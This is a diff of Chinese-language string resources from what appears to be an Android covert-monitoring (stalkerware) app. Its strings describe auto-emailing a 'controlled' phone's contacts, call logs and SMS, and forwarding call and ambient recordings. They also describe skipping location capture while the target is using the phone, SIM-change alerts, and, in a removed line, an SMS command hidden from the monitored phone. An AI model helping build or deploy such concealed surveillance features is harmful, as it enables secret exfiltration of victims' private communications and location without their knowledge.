@@ -41,8 +41,9 @@
     <!-- Mail -->
     <string name="mail_from">来自</string>
     <string name="mail_description">（内附联系人，电话，短信记录）</string>
-    <string name="mail_body_info">你好，这是来自%s的自动发信，内附联系人，电话，短信记录。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
-    <string name="mail_body_record">你好，这是来自%s的自动发信，附件是录音文件。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
+    <string name="mail_body_info">你好，这是来自%s的自动发信，内附联系人，电话，短信记录。</string>
+    <string name="mail_body_call_record">你好，这是来自%s的自动发信，附件是通话录音文件，可使用QQ影音等软件播放。</string>
+    <string name="mail_body_env_record">你好，这是来自%s的自动发信，附件是环境录音文件，可使用QQ影音等软件播放。</string>
     
     <!-- Location -->
     <string name="location_fail_screen_on">目标手机正被对方操作中，安全起见，现在不进行位置获取，请稍后再试。</string>
@@ -162,7 +163,7 @@
     <string name="msg_sms_times_over_in_trial">安卓监控提醒您：试用期转发短信已经达到5条，如需继续使用请联系</string>
     <string name="msg_recording_times_over_in_trial">安卓监控提醒您：试用期通话录音已经达到3次，如需继续使用请联系</string>
     <string name="msg_changed_sim">安卓监控提醒：%s更换了手机卡。</string>
-    <string name="msg_changed_sim_new_number_workaround">本短信手机号码即为新号码。请发送#9#加该新号码到被控手机进行确认（该短信不会在被控手机上显示）</string>
+    <string name="msg_changed_sim_new_number_workaround">本短信号码即为新号码。</string>
     <string name="msg_changed_sim_new_number">新卡号码为：%s</string>
     <string name="msg_trial_expire_or_not_licensed">安卓监控提醒您：试用期已过或未注册，无法打开设置界面。</string>
     
